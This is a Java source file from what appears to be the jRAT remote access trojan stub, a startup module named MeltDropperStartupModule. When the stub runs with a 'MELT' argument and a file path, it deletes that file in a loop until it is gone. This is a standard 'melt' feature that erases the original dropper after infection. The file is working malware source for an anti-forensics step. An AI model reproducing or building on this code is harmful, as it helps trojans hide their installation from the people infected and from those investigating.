package su.jrat.stub.modules.startup;

import java.io.File;
import java.util.Map;

import su.jrat.stub.Main;

public class MeltDropperStartupModule extends StartupModule {

	public MeltDropperStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		File filetodelete = null;	

		if (Main.args.length > 0) {
			if (Main.args[0].trim().equals("MELT")) {
				String path = Main.args[1];
				filetodelete = new File(path.replace("\"", "").trim());
			}
		}
		
		if (filetodelete != null) {
			while (filetodelete.exists()) {
				try {
					filetodelete.delete();
				} catch (Exception ex) {
					try {
						Thread.sleep(1000L);
					} finally {
					}
				}
			}
		}
	}

}
